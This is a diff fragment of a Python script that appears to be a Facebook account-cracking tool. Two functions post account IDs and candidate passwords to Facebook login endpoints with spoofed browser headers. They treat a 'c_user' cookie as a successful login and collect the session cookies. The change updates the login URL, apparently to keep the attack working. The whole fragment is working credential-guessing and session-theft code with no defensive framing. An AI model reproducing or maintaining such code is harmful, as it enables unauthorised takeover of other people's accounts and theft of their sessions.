@@ -627,7 +627,7 @@ def _M5_(ids,pasx):
 	                'accept-encoding': 'gzip, deflate, br', 
 	                'accept-language': 'zh-CN;q=0.8,zh;q=0.9', 
 	                'x-response-format': 'JSONStream'}  
-                        lo = session.post('https://en-gb.facebook.com/login.php/?login_attempt=1&display=popup',data=apple,headers=tedy).text
+                        lo = session.post('https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&popup=1&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -701,7 +701,7 @@ def _M6_(ids,pasx):
                         'Sec-Fetch-User': '?1',
                         'Pragma': 'no-cache',
                         'Cache-Control': 'no-cache',}
-                        lo = session.post('https://www.facebook.com/login.php/?login_attempt=1&display=popup',data=apple,headers=tedy).text
+                        lo = session.post('https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&popup=1&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
